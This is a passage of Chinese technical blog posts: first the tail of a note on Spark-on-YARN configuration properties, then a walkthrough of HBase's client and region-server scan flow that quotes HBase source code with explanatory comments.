4.在工程中设置环境变量SPARK_LOG4J_CONF,来引用spark log4j的位置
 
通过SPARK_YARN_USER_ENV配置其它用户定义的环境变量值。
 
通过SPARK_USE_CONC_INCR_GC配置是否使用默认的GC配置。,true/false
 
通过SPARK_JAVA_OPTS配置spark执行时的相关JAVA_OPTS.
 
通过JAVA_HOME配置java_home.
 
5.设置一些系统属性，共spark运行时的使用，当然这些个系统属性本身也有默认的值
 
a.属性名称QUEUE，默认值default。作用于am启动的队列名称,也可以在client调用进传入
 
b.属性名称spark.yarn.report.interval，默认值1000。app运行监控的间隔时间ms。
 
c.属性名称spark.yarn.submit.file.replication，默认值3。上传给yarn上运行的资源的复制份数，包括sparkjar,appjar
 
d.属性名称spark.yarn.max.worker.failures，默认值3或numworker传入参数的值*2取最大值。
 
作用于app失败的重试次数,如果重试次数超过了指定的值，表示app运行失败。
 
e.属性名称spark.yarn.applicationMaster.waitTries，默认值10。等待SparkContext初始化完成的等待次数，
 
每次的等待时，让ApplicationMaster.sparkContextRef.wait=10000ms
 
f.属性名称spark.yarn.scheduler.heartbeat.interval-ms，默认值5000，
 
通过此配置向RM设置am向其报告的时间间隔。
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
UserScan的处理流程分析, hongs-yang.iteye.com.blog.2054628, Fri, 25 Apr 2014 16:46:55 +0800

UserScan的处理流程分析
 
前置说明
 
Userscan是通过client或cp中发起的scanner操作。
 
在Scan中通过caching属性来返回可以返回多少条数据，每次进行next时。
 
通过batch属性来设置每次在rs端每次next kv时，可读取多少个kv，(在同一行的情况下)
 
在生成Scan实例时，最好是把family与column都设置上，这样能保证查询的最高效.
 
client端通过生成Scan实例，通过HTable下的如下方法得到ClientScanner实例
 
 public ResultScanner getScanner(final Scan scan)
 
在生成的ClientScanner实例中的callable属性的值为生成的一个ScannerCallable实例。
 
并通过callable.prepare(tries != 0);方法得到此scan的startkey所在的region的location.在meta表中。
 
把startkey对应的location中得到此location的HRegionInfo信息。
 
并设置ClientScanner.currentRegion的值为当前的region.也就是startkey所在的region.
 
 
 
通过ClientScanner.next向rs发起rpc调用操作。调用HRegionServer.scan
 
public ScanResponse scan(finalRpcControllercontroller, final ScanRequest request)
 
 
 
 
 
ClientScanner.next时，首先是发起openScanner操作，得到一个ScannerId
 
通过ScannerCallable.call方法：
 
if (scannerId == -1L) {
 
this.scannerId = openScanner();
 
 } else {
 
openScanner方法:中发起一个scan操作，通过rpc调用rs.scan
 
 ScanRequest request =
 
 RequestConverter.buildScanRequest(
 
getLocation().getRegionInfo().getRegionName(),
 
this.scan, 0, false);
 
try {
 
 ScanResponse response = getStub().scan(null, request);
 
longid = response.getScannerId();
 
if (logScannerActivity) {
 
LOG.info("Open scanner=" + id + " for scan=" + scan.toString()
 
 + " on region " + getLocation().toString());
 
 }
 
returnid;
 
 
 
HregionServer.scan中对openScanner的处理：
 
public ScanResponse scan(finalRpcControllercontroller, final ScanRequest request)
 
throws ServiceException {
 
 Leases.Lease lease = null;
 
 String scannerName = null;
 
........................................很多代码没有显示
 
requestCount.increment();
 
 
 
intttl = 0;
 
 HRegion region = null;
 
RegionScannerscanner = null;
 
 RegionScannerHolder rsh = null;
 
booleanmoreResults = true;
 
booleancloseScanner = false;
 
 ScanResponse.Builder builder = ScanResponse.newBuilder();
 
if (request.hasCloseScanner()) {
 
closeScanner = request.getCloseScanner();
 
 }
 
introws = 1;
 
if (request.hasNumberOfRows()) {
 
rows = request.getNumberOfRows();
 
 }
 
if (request.hasScannerId()) {
 
 .................................很多代码没有显示
 
 } else {
 
得到请求的HRegion实例,也就是startkey所在的HRegion
 
region = getRegion(request.getRegion());
 
 ClientProtos.Scan protoScan = request.getScan();
 
booleanisLoadingCfsOnDemandSet = protoScan.hasLoadColumnFamiliesOnDemand();
 
 Scan scan = ProtobufUtil.toScan(protoScan);
 
// if the request doesn't set this, get the default region setting.
 
if (!isLoadingCfsOnDemandSet) {
 
scan.setLoadColumnFamiliesOnDemand(region.isLoadingCfsOnDemandDefault());
 
 }
 
scan.getAttribute(Scan.SCAN_ATTRIBUTES_METRICS_ENABLE);
 
如果scan没有设置family,把region中所有的family当成scan的family
 
region.prepareScanner(scan);
 
if (region.getCoprocessorHost() != null) {
 
scanner = region.getCoprocessorHost().preScannerOpen(scan);
 
 }
 
if (scanner == null) {
 
执行HRegion.getScanner方法。生成HRegion.RegionScannerImpl方法
 
scanner = region.getScanner(scan);
 
 }
 
if (region.getCoprocessorHost() != null) {
 
scanner = region.getCoprocessorHost().postScannerOpen(scan, scanner);
 
 }
 
把生成的RegionScanner添加到scanners集合容器中。并设置scannerid(一个随机的值),
 
 scannername是scannerid的string版本。添加过期监控处理，
 
通过hbase.client.scanner.timeout.period配置过期时间，默认值为60000ms
 
老版本通过hbase.regionserver.lease.period配置。
 
过期检查线程通过Leases完成。对scanner的过期处理通过一个
 
 HregionServer.ScannerListener.leaseExpired实例来完成。
 
 
 
scannerId = addScanner(scanner, region);
 
scannerName = String.valueOf(scannerId);
 
ttl = this.scannerLeaseTimeoutPeriod;
 
 }
 
............................................很多代码没有显示
 
 
 
Hregion.getScanner方法生成RegionScanner实例流程
 
 
 
publicRegionScannergetScanner(Scan scan) throws IOException {
 
returngetScanner(scan, null);
 
 }
 
 
 
层次的调用,此时传入的kvscannerlist为null
 
protectedRegionScannergetScanner(Scan scan,
 
List<KeyValueScanner> additionalScanners) throws IOException {
 
startRegionOperation(Operation.SCAN);
 
try {
 
// Verify families are all valid
 
prepareScanner(scan);
 
if(scan.hasFamilies()) {
 
for(byte [] family : scan.getFamilyMap().keySet()) {
 
checkFamily(family);
 
 }
 
 }
 
returninstantiateRegionScanner(scan, additionalScanners);
 
 } finally {
 
closeRegionOperation();
 
 }
 
 }
 
 
 
最终生成一个HRegion.RegionScannerImpl实例
 
protectedRegionScannerinstantiateRegionScanner(Scan scan,
 
List<KeyValueScanner> additionalScanners) throws IOException {
 
returnnewRegionScannerImpl(scan, additionalScanners, this);
 
 }
 
 
 
RegionScanner实例的生成构造方法：
 
RegionScannerImpl(Scan scan, List<KeyValueScanner> additionalScanners, HRegion region)
 
throws IOException {
 
 
 
this.region = region;
 
this.maxResultSize = scan.getMaxResultSize();
 
if (scan.hasFilter()) {
 
this.filter = newFilterWrapper(scan.getFilter());
 
 } else {
 
this.filter = null;
 
 }
 
 
 
this.batch = scan.getBatch();
 
if (Bytes.equals(scan.getStopRow(), HConstants.EMPTY_END_ROW) && !scan.isGetScan()) {
 
this.stopRow = null;
 
 } else {
 
this.stopRow = scan.getStopRow();
 
 }
 
// If we are doing a get, we want to be [startRow,endRow] normally
 
// it is [startRow,endRow) and if startRow=endRow we get nothing.
 
this.isScan = scan.isGetScan() ? -1 : 0;
 
 
 
// synchronize on scannerReadPoints so that nobody calculates
 
// getSmallestReadPoint, before scannerReadPoints is updated.
 
IsolationLevelisolationLevel = scan.getIsolationLevel();
 
synchronized(scannerReadPoints) {
 
if (isolationLevel == IsolationLevel.READ_UNCOMMITTED) {
 
// This scan can read even uncommitted transactions
 
this.readPt = Long.MAX_VALUE;
 
 MultiVersionConsistencyControl.setThreadReadPoint(this.readPt);
 
 } else {
 
this.readPt = MultiVersionConsistencyControl.resetThreadReadPoint(mvcc);
 
 }
 
scannerReadPoints.put(this, this.readPt);
 
 }
 
 
 
// Here we separate all scanners into two lists - scanner that provide data required
 
// by the filter to operate (scanners list) and all others (joinedScanners list).
 
List<KeyValueScanner> scanners = newArrayList<KeyValueScanner>();
 
List<KeyValueScanner> joinedScanners = newArrayList<KeyValueScanner>();
 
if (additionalScanners != null) {
 
scanners.addAll(additionalScanners);
 
 }
 
迭代每一个要进行scan的store。生成具体的StoreScanner实例。通常情况下joinedHead的值为null
 
for (Map.Entry<byte[], NavigableSet<byte[]>> entry :
 
scan.getFamilyMap().entrySet()) {
 
Storestore = stores.get(entry.getKey());
 
生成StoreScanner实例。通过HStore.getScanner(scan,columns);
 
KeyValueScannerscanner = store.getScanner(scan, entry.getValue());
 
if (this.filter == null || !scan.doLoadColumnFamiliesOnDemand()
 
 || this.filter.isFamilyEssential(entry.getKey())) {
 
scanners.add(scanner);
 
 } else {
 
joinedScanners.add(scanner);
 
 }
 
 }
 
生成KeyValueHeap实例，把所有的storescanner的开始位置移动到startkey的位置并得到top的StoreScanner,
 
this.storeHeap = newKeyValueHeap(scanners, comparator);
 
if (!joinedScanners.isEmpty()) {
 
this.joinedHeap = newKeyValueHeap(joinedScanners, comparator);
 
 }
 
 }
 
 
 
得到StoreScanner实例的HStore.getScanner(scan,columns)方法
 
publicKeyValueScannergetScanner(Scan scan,
 
finalNavigableSet<byte []> targetCols) throws IOException {
 
lock.readLock().lock();
 
try {
 
KeyValueScannerscanner = null;
 
if (this.getCoprocessorHost() != null) {
 
scanner = this.getCoprocessorHost().preStoreScannerOpen(this, scan, targetCols);
 
 }
 
if (scanner == null) {
 
scanner = newStoreScanner(this, getScanInfo(), scan, targetCols);
 
 }
 
returnscanner;
 
 } finally {
 
lock.readLock().unlock();
 
 }
 
 }
 
生成StoreScanner的构造方法：
 
publicStoreScanner(Storestore, ScanInfo scanInfo, Scan scan, finalNavigableSet<byte[]> columns)
 
throws IOException {
 
this(store, scan.getCacheBlocks(), scan, columns, scanInfo.getTtl(),
 
scanInfo.getMinVersions());
 
如果设置有scan的_raw_属性时，columns的值需要为null
 
if (columns != null && scan.isRaw()) {
 
thrownewDoNotRetryIOException(
 
"Cannot specify any column for a raw scan");
 
 }
 
matcher = newScanQueryMatcher(scan, scanInfo, columns,
 
ScanType.USER_SCAN, Long.MAX_VALUE, HConstants.LATEST_TIMESTAMP,
 
oldestUnexpiredTS);
 
得到StoreFileScanner,StoreFileScanner中引用的StoreFile.Reader中引用HFileReaderV2,
 
HFileReaderV2的实例在StoreFile.Reader中如果已经存在，不会重新创建，这样会加快scanner的创建时间。
 
// Pass columns to try to filter out unnecessary StoreFiles.
 
List<KeyValueScanner> scanners = getScannersNoCompaction();
 
 
 
// Seek all scanners to the start of the Row (or if the exact matching row
 
// key does not exist, then to the start of the next matching Row).
 
// Always check bloom filter to optimize the top row seek for delete
 
// family marker.
 
if (explicitColumnQuery && lazySeekEnabledGlobally) {
 
for (KeyValueScannerscanner : scanners) {
 
scanner.requestSeek(matcher.getStartKey(), false, true);
 
 }
 
 } else {
 
if (!isParallelSeekEnabled) {
 
for (KeyValueScannerscanner : scanners) {
 
scanner.seek(matcher.getStartKey());
 
 }
 
 } else {
 
parallelSeek(scanners, matcher.getStartKey());
 
 }
 
 }
 
 
 
// set storeLimit
 
this.storeLimit = scan.getMaxResultsPerColumnFamily();
 
 
 
// set rowOffset
 
this.storeOffset = scan.getRowOffsetPerColumnFamily();
 
 
 
// Combine all seeked scanners with a heap
 
heap = newKeyValueHeap(scanners, store.getComparator());
 
注册，如果有storefile更新时，把更新后的storefile添加到这个StoreScanner中来。
 
this.store.addChangedReaderObserver(this);
 
 }
 
 
 
发起scan的rpc操作
 
client端发起openScanner操作后，得到一个scannerId.此时发起scan操作。
 
通过ScannerCallable.call中发起call的操作，在scannerId不等于-1时，
 
 
 
 Result [] rrs = null;
 
 ScanRequest request = null;
 
try {
 
incRPCcallsMetrics();
 
request = RequestConverter.buildScanRequest(scannerId, caching, false, nextCallSeq);
 
 ScanResponse response = null;
 
 PayloadCarryingRpcController controller = newPayloadCarryingRpcController();
 
try {
 
controller.setPriority(getTableName());
 
response = getStub().scan(controller, request);
 
...................................此处省去一些代码
 
nextCallSeq++;
 
longtimestamp = System.currentTimeMillis();
 
// Results are returned via controller
 
CellScannercellScanner = controller.cellScanner();
 
rrs = ResponseConverter.getResults(cellScanner, response);
 
 
 
 
 
HregionServer.scan方法中对scan时的处理流程：
 
得到scan中的caching属性的值，此值主要用来响应client返回的条数。如果一行数据包含多个kv，算一条
 
introws = 1;
 
if (request.hasNumberOfRows()) {
 
rows = request.getNumberOfRows();
 
 }
 
如果client传入的scannerId有值，也就是不等于-1时，表示不是openScanner操作，检查scannerid是否过期
 
if (request.hasScannerId()) {
 
rsh = scanners.get(scannerName);
 
if (rsh == null) {
 
LOG.info("Client tried to access missing scanner " + scannerName);
 
thrownewUnknownScannerException(
 
"Name: " + scannerName + ", already closed?");
 
 }
 
此处主要是检查region是否发生过split操作。如果是会出现NotServingRegionException操作。
 
scanner = rsh.s;
 
 HRegionInfo hri = scanner.getRegionInfo();
 
region = getRegion(hri.getRegionName());
 
if (region != rsh.r) { // Yes, should be the same instance
 
thrownewNotServingRegionException("Region was re-opened after the scanner"
 
 + scannerName + " was created: " + hri.getRegionNameAsString());
 
 }
 
 } else {
 
 ...................................此处省去一些生成Regionscanner的代码
 
 }
 
表示有设置caching,如果是执行scan,此时的默认值为1,当前scan中设置有caching后，使用scan中设置的值
 
if (rows > 0) {
 
// if nextCallSeq does not match throw Exception straight away. This needs to be
 
// performed even before checking of Lease.
 
// See HBASE-5974
 
是否有配置nextCallSeq的值，第一次调用时，此值为0,每调用一次加一,client也一样，每调用一次加一。
 
if (request.hasNextCallSeq()) {
 
if (rsh == null) {
 
rsh = scanners.get(scannerName);
 
 }
 
if (rsh != null) {
 
if (request.getNextCallSeq() != rsh.nextCallSeq) {
 
thrownewOutOfOrderScannerNextException("Expected nextCallSeq: " + rsh.nextCallSeq
 
 + " But the nextCallSeq got from client: " + request.getNextCallSeq() +
 
"; request=" + TextFormat.shortDebugString(request));
 
 }
 
// Increment the nextCallSeq value which is the next expected from client.
 
rsh.nextCallSeq++;
 
 }
 
 }
 
try {
 
先从租约管理中移出此租约，防止查找时间大于过期时间而出现的超时
 
// Remove lease while its being processed in server; protects against case
 
// where processing of request takes > lease expiration time.
 
lease = leases.removeLease(scannerName);
 
生成要返回的条数的一个列表，scan.caching
 
List<Result> results = newArrayList<Result>(rows);
 
longcurrentScanResultSize = 0;
 
 
 
booleandone = false;
 
调用cp的preScannernext,如果返回为true,表示不在执行scan操作。
 
// Call coprocessor. Get region info from scanner.
 
if (region != null && region.getCoprocessorHost() != null) {
 
 Boolean bypass = region.getCoprocessorHost().preScannerNext(
 
scanner, results, rows);
 
if (!results.isEmpty()) {
 
for (Result r : results) {
 
if (maxScannerResultSize < Long.MAX_VALUE){
 
for (Cellkv : r.rawCells()) {
 
// TODO
 
currentScanResultSize += KeyValueUtil.ensureKeyValue(kv).heapSize();
 
 }
 
 }
 
 }
 
 }
 
if (bypass != null && bypass.booleanValue()) {
 
done = true;
 
 }
 
 }
 
执行scan操作。Cp的preScannerNext返回为false,或没有设置cp(主要是RegionObServer)
 
返回给client的最大size通过hbase.client.scanner.max.result.size配置，默认为long.maxvalue
 
如果scan也设置有maxResultSize,使用scan设置的值
 
if (!done) {
 
longmaxResultSize = scanner.getMaxResultSize();
 
if (maxResultSize <= 0) {
 
maxResultSize = maxScannerResultSize;
 
 }
 
List<Cell> values = newArrayList<Cell>();
 
 MultiVersionConsistencyControl.setThreadReadPoint(scanner.getMvccReadPoint());
 
region.startRegionOperation(Operation.SCAN);
 
try {
 
inti = 0;
 
synchronized(scanner) {
 
此处开始迭代，开始调用regionScanner(HRegion.RegionScannerImpl.nextRaw(List))进行查找，
 
迭代的长度为scan设置的caching的大小,如果执行RegionScanner.nextRaw(List)返回为false,时也会停止迭代
 
for (; i < rows
 
 && currentScanResultSize < maxResultSize; i++) {
 
返回的true表示还有数据，可以接着查询，否则表示此region中已经没有符合条件的数据了。
 
// Collect values to be returned here
 
booleanmoreRows = scanner.nextRaw(values);
 
if (!values.isEmpty()) {
 
if (maxScannerResultSize < Long.MAX_VALUE){
 
for (Cellkv : values) {
 
currentScanResultSize += KeyValueUtil.ensureKeyValue(kv).heapSize();
 
 }
 
 }
 
results.add(Result.create(values));
 
 }
 
if (!moreRows) {
 
break;
 
 }
 
values.clear();
 
 }
 
 }
 
region.readRequestsCount.add(i);
 
 } finally {
 
region.closeRegionOperation();
 
 }
 
 
 
// coprocessor postNext hook
 
if (region != null && region.getCoprocessorHost() != null) {
 
region.getCoprocessorHost().postScannerNext(scanner, results, rows, true);
 
 }
 
 }
 
如果没有可以再查找的数据时，设置response的moreResults为false
 
// If the scanner's filter - if any - is done with the scan
 
// and wants to tell the client to stop the scan. This is done by passing
 
// a null result, and setting moreResults to false.
 
if (scanner.isFilterDone() && results.isEmpty()) {
 
moreResults = false;
 
results = null;
 
 } else {
 
添加结果到response中，如果hbase.client.rpc.codec配置有codec的值，
 
 默认取hbase.client.default.rpc.codec配置的值，默认为KeyValueCodec
 
如果上面说的codec配置不为null时，把results生成为一个iterator,并生成一个匿名的CallScanner实现类
 
设置到scan时传入的controller中。这样能提升查询数据的读取性能。
 
如果没有配置codec时，默认直接把results列表设置到response中，这样响应的数据可能会比较大。
 
addResults(builder, results, controller);
 
 }
 
 } finally {
 
重新把租约放入到租约检查管理器中，此租约主要来检查client多长时间没有发起过scan的操作。
 
// We're done. On way out re-add the above removed lease.
 
// Adding resets expiration time on lease.
 
if (scanners.containsKey(scannerName)) {
 
if (lease != null) leases.addLease(lease);
 
ttl = this.scannerLeaseTimeoutPeriod;
 
 }
 
 }
 
 }
 
 
 
client端获取响应的数据：ScannerCallable.call方法中
 
rrs = ResponseConverter.getResults(cellScanner, response);
 
 
 
ResponseConverter.getResults方法的实现
 
publicstatic Result[] getResults(CellScannercellScanner, ScanResponse response)
 
throws IOException {
 
if (response == null) returnnull;
 
// If cellscanner, then the number of Results to return is the count of elements in the
 
// cellsPerResult list. Otherwise, it is how many results are embedded inside the response.
 
intnoOfResults = cellScanner != null?
 
response.getCellsPerResultCount(): response.getResultsCount();
 
 Result[] results = new Result[noOfResults];
 
for (inti = 0; i < noOfResults; i++) {
 
cellScanner如果codec配置为有值时，在rs响应时会生成一个匿名的实现
 
if (cellScanner != null) {
 
......................................
 
intnoOfCells = response.getCellsPerResult(i);
 
List<Cell> cells = newArrayList<Cell>(noOfCells);
 
for (intj = 0; j < noOfCells; j++) {
 
try {
 
if (cellScanner.advance() == false) {
 
.....................................
 
 String msg = "Results sent from server=" + noOfResults + ". But only got " + i
 
 + " results completely at client. Resetting the scanner to scan again.";
 
LOG.error(msg);
 
thrownewDoNotRetryIOException(msg);
 
 }
 
 } catch (IOException ioe) {
 
...........................................
 
LOG.error("Exception while reading cells from result."
 
 + "Resetting the scanner to scan again.", ioe);
 
thrownewDoNotRetryIOException("Resetting the scanner.", ioe);
 
 }
 
cells.add(cellScanner.current());
 
 }
 
results[i] = Result.create(cells);
 
 } else {
 
否则，没有设置codec，直接从response中读取出来数据，
 
// Result is pure pb.
 
results[i] = ProtobufUtil.toResult(response.getResults(i));
 
 }
 
 }
 
returnresults;
 
 }
 
 
 
在ClientScanner.next方法中，如果还没有达到scan的caching的值，(默认为1)也就是countdown的值还不等于0
 
,countdown的值为得到一个Result时减1，通过nextScanner重新得到下一个region，并发起连接去scan数据。
 
 
 
Do{
 
.........................此处省去一些代码。
 
if (values != null && values.length > 0) {
 
for (Result rs : values) {
 
cache.add(rs);
 
for (Cellkv : rs.rawCells()) {
 
// TODO make method in Cell or CellUtil
 
remainingResultSize -= KeyValueUtil.ensureKeyValue(kv).heapSize();
 
 }
 
countdown--;
 
this.lastResult = rs;
 
 }
 
 }
 
} while (remainingResultSize > 0 && countdown > 0 && nextScanner(countdown, values == null));
 
 
 
对于这种类型的查询操作，可以使用得到一个ClientScanner后，不执行close操作。
 
在rs的timeout前每次定期去从rs中拿一定量的数据下来。缓存到ClientScanner的cache中。
 
每次next时从cache中直接拿数据
 
 
 
Hregion.RegionScannerImpl.nextRaw(list)方法分析
 
RegionScannerImpl是对RegionScanner接口的实现。
 
Rs的scan在执行时通过regionScanner.nextRaw(list)来获取数据。
 
通过regionScanner.isFilterDone来检查此region的查找是否完成。
 
 
 
调用nextRaw方法，此方法调用另一个重载方法，batch是scan中设置的每次可查询最大的单行中的多少个kv的kv个数
 
publicbooleannextRaw(List<Cell> outResults)
 
throws IOException {
 
returnnextRaw(outResults, batch);
 
 }
 
 
 
publicbooleannextRaw(List<Cell> outResults, intlimit) throws IOException {
 
booleanreturnResult;
 
调用nextInternal方法。
 
if (outResults.isEmpty()) {
 
// Usually outResults is empty. This is true when next is called
 
// to handle scan or get operation.
 
returnResult = nextInternal(outResults, limit);
 
 } else {
 
List<Cell> tmpList = newArrayList<Cell>();
 
returnResult = nextInternal(tmpList, limit);
 
outResults.addAll(tmpList);
 
 }
 
调用filter.reset方法，清空当前row的filter的相关信息。
 
ResetFilters();
 
如果filter.filterAllRemaining()的返回值为true,时表示当前region的查找条件已经结束，不能在执行查找操作。
 
没有可以接着查找的需要，也就是没有更多要查找的行了。
 
if (isFilterDone()) {
 
returnfalse;
 
 }
 
................................此处省去一些代码
 
returnreturnResult;
 
 }
 
 
 
nextInternal方法处理流程：
 
privatebooleannextInternal(List<Cell> results, intlimit)
 
throws IOException {
 
if (!results.isEmpty()) {
 
thrownewIllegalArgumentException("First parameter should be an empty list");
 
 }
 
RpcCallContextrpcCall = RpcServer.getCurrentCall();
 
// The loop here is used only when at some point during the next we determine
 
// that due to effects of filters or otherwise, we have an empty row in the result.
 
// Then we loop and try again. Otherwise, we must get out on the first iteration via return,
 
// "true" if there's more data to read, "false" if there isn't (storeHeap is at a stop row,
 
// and joinedHeap has no more data to read for the last row (if set, joinedContinuationRow).
 
while (true) {
 
if (rpcCall != null) {
 
// If a user specifies a too-restrictive or too-slow scanner, the
 
// client might time out and disconnect while the server side
 
// is still processing the request. We should abort aggressively
 
// in that case.
 
longafterTime = rpcCall.disconnectSince();
 
if (afterTime >= 0) {
 
thrownewCallerDisconnectedException(
 
"Aborting on region " + getRegionNameAsString() + ", call " +
 
this + " after " + afterTime + " ms, since " +
 
"caller disconnected");
 
 }
 
 }
 
得到通过startkey seek后当前最小的一个kv。
 
// Let's see what we have in the storeHeap.
 
 KeyValue current = this.storeHeap.peek();
 
 
 
byte[] currentRow = null;
 
intoffset = 0;
 
shortlength = 0;
 
if (current != null) {
 
currentRow = current.getBuffer();
 
offset = current.getRowOffset();
 
length = current.getRowLength();
 
 }
 
检查是否到了stopkey,如果是，返回false,joinedContinuationRow是多个cf的关联查找，不用去管它
 
booleanstopRow = isStopRow(currentRow, offset, length);
 
// Check if we were getting data from the joinedHeap and hit the limit.
 
// If not, then it's main path - getting results from storeHeap.
 
if (joinedContinuationRow == null) {
 
// First, check if we are at a stop row. If so, there are no more results.
 
if (stopRow) {
 
如果是stopRow,同时filter.hasFilterRow返回为true时，
 
可通过filterRowCells来检查要返回的kvlist,也可以用来修改要返回的kvlist
 
if (filter != null && filter.hasFilterRow()) {
 
filter.filterRowCells(results);
 
 }
 
returnfalse;
 
 }
 
通过filter.filterRowkey来过滤检查key是否需要排除，如果是排除返回true,否则返回false
 
// Check if rowkey filter wants to exclude this row. If so, loop to next.
 
// Technically, if we hit limits before on this row, we don't need this call.
 
if (filterRowKey(currentRow, offset, length)) {
 
如果rowkey是需要排除的rowkey,检查是否有下一行数据。如果没有下一行数据，返回flase,表示当前region查找结束
 
否则清空当前的results,重新进行查找
 
booleanmoreRows = nextRow(currentRow, offset, length);
 
if (!moreRows) returnfalse;
 
results.clear();
 
continue;
 
 }
 
开始执行region下此scan需要的所有store的StoreScanner的next进行查找，把查找的结果放到results列表中。
 
如果一行中包含有多个kv，现在查找这些kv达到传入的limit的大小的时候，返回kv_limit的一个空的kv。
 
(查找的大小已经达到limit(batch)的一行最大scan的kv个数，返回kv_limit),
 
否则表示还没有查找到limit的kv个数，但是当前row对应的所有达到条件的kv都已经查找完成，返回最后一个kv。
 
返回的kv如果不是kv_limit，那么有可能是null或者是下一行的第一个kv.
 
 KeyValue nextKv = populateResult(results, this.storeHeap, limit, currentRow, offset,
 
length);
 
如果达到limit的限制时，filter.hasFilterRow的值一定得是false,
 
 否则会throw IncompatibleFilterException
 
如果达到limit的限制时，返回true,当前row的所有kv查找结束，返回true可以接着向下查找
 
提示：如果hbase一行数据中可能包含多个kv时，最好是在scan时设置batch的属性，否则会一直查找到所有的kv结束
 
// Ok, we are good, let's try to get some results from the main heap.
 
if (nextKv == KV_LIMIT) {
 
if (this.filter != null && filter.hasFilterRow()) {
 
thrownewIncompatibleFilterException(
 
"Filter whose hasFilterRow() returns true is incompatible with scan with limit!");
 
 }
 
returntrue; // We hit the limit.
 
 }
 
是否到结束行，从这一行代码中可以看出，stoprow是不包含的，因为nextKv肯定是下一行row中第一个kv的值
 
stopRow = nextKv == null ||
 
isStopRow(nextKv.getBuffer(), nextKv.getRowOffset(), nextKv.getRowLength());
 
// save that the row was empty before filters applied to it.
 
finalbooleanisEmptyRow = results.isEmpty();
 
 
 
如果是stopRow,同时filter.hasFilterRow返回为true时，
 
可通过filterRowCells来检查要返回的kvlist,也可以用来修改要返回的kvlist
 
// We have the part of the row necessary for filtering (all of it, usually).
 
// First filter with the filterRow(List).
 
if (filter != null && filter.hasFilterRow()) {
 
filter.filterRowCells(results);
 
 }
 
如果当前row的查找没有找到合法的kv，也就是results的列表没有值，检查是否还有下一行，
 
如果有，重新进行查找，否则表示当前region的查找最结尾处，不能再进行查找，返回fasle
 
if (isEmptyRow) {
 
booleanmoreRows = nextRow(currentRow, offset, length);
 
if (!moreRows) returnfalse;
 
results.clear();
 
// This row was totally filtered out, if this is NOT the last row,
 
// we should continue on. Otherwise, nothing else to do.
 
if (!stopRow) continue;
 
returnfalse;
 
 }
 
 
 
// Ok, we are done with storeHeap for this row.
 
// Now we may need to fetch additional, non-essential data into row.
 
// These values are not needed for filter to work, so we postpone their
 
// fetch to (possibly) reduce amount of data loads from disk.
 
if (this.joinedHeap != null) {
 
..................................进行关联查找的代码，不显示，也不分析
 
 }
 
 } else {
 
多个store进行关联查询，不分析，通常情况不会有
 
// Populating from the joined heap was stopped by limits, populate some more.
 
populateFromJoinedHeap(results, limit);
 
 }
 
 
 
// We may have just called populateFromJoinedMap and hit the limits. If that is
 
// the case, we need to call it again on the next next() invocation.
 
if (joinedContinuationRow != null) {
 
returntrue;
 
 }
 
如果这次的查找,results的结果为空，表示没有查找到结果，检查是否还有下一行数据，如果有重新进行查找，
 
否则返回false表示此region的查找结束
 
// Finally, we are done with both joinedHeap and storeHeap.
 
// Double check to prevent empty rows from appearing in result. It could be
 
// the case when SingleColumnValueExcludeFilter is used.
 
if (results.isEmpty()) {
 
booleanmoreRows = nextRow(currentRow, offset, length);
 
if (!moreRows) returnfalse;
 
if (!stopRow) continue;
 
 }
 
非stoprow时，表示还可以有下一行的数据，也就是可以接着进行next操作。否则表示此region的查找结束
 
// We are done. Return the result.
 
return !stopRow;
 
 }
 
 }
 
 
 
UserScan时的ScanQueryMatcher.match方法处理
 
user scan时的ScanQueryMatcher在newRegionScannerImpl(scan, additionalScanners, this);时生成。
 
在生成StoreScanner时通过如下代码生成matcher实例。
 
 
 
matcher = newScanQueryMatcher(scan, scanInfo, columns,
 
ScanType.USER_SCAN, Long.MAX_VALUE, HConstants.LATEST_TIMESTAMP,
 
oldestUnexpiredTS);
 
 
 
matcher.isUserScan的值此时为true.
 
 
 
publicMatchCodematch(KeyValue kv) throws IOException {
 
检查当前region的查找是否结束。pageFilter就是通过控制此filter中的方法来检查是否需要
 
if (filter != null && filter.filterAllRemaining()) {
 
returnMatchCode.DONE_SCAN;
 
 }
 
 
 
byte [] bytes = kv.getBuffer();
 
intoffset = kv.getOffset();
 
 
 
intkeyLength = Bytes.toInt(bytes, offset, Bytes.SIZEOF_INT);
 
offset += KeyValue.ROW_OFFSET;
 
 
 
intinitialOffset = offset;
 
 
 
shortrowLength = Bytes.toShort(bytes, offset, Bytes.SIZEOF_SHORT);
 
offset += Bytes.SIZEOF_SHORT;
 
检查传入的kv是否是当前行的kv，也就是rowkey是否相同，如果当前的rowkey小于传入的rowkey，
 
表示现在已经next到下一行了，返回DONE,表示当前行查找结束
 
intret = this.rowComparator.compareRows(row, this.rowOffset, this.rowLength,
 
bytes, offset, rowLength);
 
if (ret <= -1) {
 
returnMatchCode.DONE;
 
 } elseif (ret >= 1) {
 
如果当前的rowkey大于传入的rowkey，表示当前next出来的kv比现在的kv要小，执行nextrow操作。
 
// could optimize this, if necessary?
 
// Could also be called SEEK_TO_CURRENT_ROW, but this
 
// should be rare/never happens.
 
returnMatchCode.SEEK_NEXT_ROW;
 
 }
 
是否跳过当前行的其它kv比较，这是一个优化项。
 
// optimize case.
 
if (this.stickyNextRow)
 
returnMatchCode.SEEK_NEXT_ROW;
 
如果当前行的所有要查找的(scan)column都查找完成了，其它的当前行中非要scan的kv，
 
直接不比较,执行nextrow操作。
 
if (this.columns.done()) {
 
stickyNextRow = true;
 
returnMatchCode.SEEK_NEXT_ROW;
 
 }
 
 
 
//Passing rowLength
 
offset += rowLength;
 
 
 
//Skipping family
 
bytefamilyLength = bytes [offset];
 
offset += familyLength + 1;
 
 
 
intqualLength = keyLength -
 
 (offset - initialOffset) - KeyValue.TIMESTAMP_TYPE_SIZE;
 
检查当前KV的TTL是否过期，如果过期，检查是否SCAN中还有下一个COLUMN，如果有返回SEEK_NEXT_COL。
 
否则返回SEEK_NEXT_ROW。
 
longtimestamp = Bytes.toLong(bytes, initialOffset + keyLength - KeyValue.TIMESTAMP_TYPE_SIZE);
 
// check for early out based on timestamp alone
 
if (columns.isDone(timestamp)) {
 
returncolumns.getNextRowOrNextColumn(bytes, offset, qualLength);
 
 }
 
 
 
/*
 
 * The delete logic is pretty complicated now.
 
 * This is corroborated by the following:
 
 * 1. The store might be instructed to keep deleted rows around.
 
 * 2. A scan can optionally see past a delete marker now.
 
 * 3. If deleted rows are kept, we have to find out when we can
 
 * remove the delete markers.
 
 * 4. Family delete markers are always first (regardless of their TS)
 
